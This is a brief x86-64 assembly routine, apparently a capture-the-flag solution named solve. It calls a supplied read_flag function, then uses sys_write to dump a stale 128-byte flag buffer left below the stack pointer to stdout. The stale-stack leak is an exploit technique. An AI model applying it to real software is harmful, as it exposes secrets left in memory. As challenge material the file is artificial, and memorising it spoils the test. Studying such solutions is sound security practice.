.intel_syntax noprefix  
.global solve

solve:
    # 1. Call the read_flag function pointer passed in rdi
    call rdi
    
    # 2. Load the effective address of the stale 128-byte flag buffer into rsi
    lea rsi, qword ptr [rsp-0x88]
    
    # 3. Set file descriptor to 1 (stdout)
    mov rdi, 1
    
    # 4. Set write length to 128 bytes
    mov rdx, 128
    
    # 5. Set syscall number to 1 (sys_write)
    mov rax, 1
    
    # 6. Invoke syscall to dump the flag to stdout
    syscall

    ret
